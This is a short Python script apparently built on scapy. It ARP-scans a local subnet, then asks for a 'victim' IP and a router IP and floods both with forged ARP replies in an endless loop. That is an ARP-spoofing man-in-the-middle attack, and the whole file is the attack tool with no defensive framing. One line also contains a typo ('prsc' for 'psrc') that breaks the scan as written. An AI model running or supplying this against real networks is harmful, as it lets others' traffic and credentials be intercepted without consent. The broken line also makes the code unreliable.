from scapy.all import ARP, Ether, srp   
import scapy.all as scap

print("Enter network ip : (example : 192.168.1.0/24)")
target_ip = input()
arp = ARP(pdst=target_ip)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether/arp

result = srp(packet, timeout=3, verbose=0)[0]

ip = []
mac = []

for _, received in result:
    ip.append(received.prsc)
    mac.append(received.hwsrc)

print("ips in the network", ip)
print("macs in the network", mac)


print("Enter victim ip")
victim = input()
print("Enter router ip")
router = input()

while True:
    arp_response = ARP(pdst=victim, hwdst=mac[ip.index(victim)], psrc=router)
    scap.send(arp_response)
    arp_response = ARP(pdst=router, hwdst=mac[ip.index(router)], psrc=victim)
    scap.send(arp_response)